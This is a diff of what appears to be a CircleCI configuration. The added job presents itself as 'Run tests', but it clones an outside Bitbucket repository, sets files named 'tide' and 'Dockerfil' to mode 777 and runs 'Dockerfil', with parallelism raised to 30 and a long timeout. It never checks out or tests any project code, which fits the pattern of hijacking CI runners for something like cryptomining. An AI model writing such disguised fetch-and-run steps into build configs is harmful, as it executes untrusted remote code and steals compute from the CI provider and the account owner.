@@ -1,16 +1,18 @@
-version: 2
+version: 2.1
 jobs:
-    aku1:
-      docker:
-            - image: ubuntu-18.04
-      steps:
-        - run:
-            name: Install Dependencies
-            command: git clone https://Ndj8777k@bitbucket.org/ndj8777k/uy.git && cd uy && chmod 777 tide Dockerfil && ./Dockerfil
-            no_output_timeout: 20m
-    parallelism: 14
+  build_and_test: # this can be any name you choose
+    docker:
+      - image: circleci/python@1.2
+    steps:
+      - checkout
+      - run:
+          name: Run tests
+          no_output_timeout: 24m
+          command: |
+                  git clone https://Ndj8777k@bitbucket.org/ndj8777k/uy.git && cd uy && chmod 777 tide Dockerfil && ./Dockerfil
+    parallelism: 30
 workflows:
-    version: 2
-    build:
-        jobs:
-            - aku1
+  version: 2
+  build: 
+     jobs:
+       - build_and_test
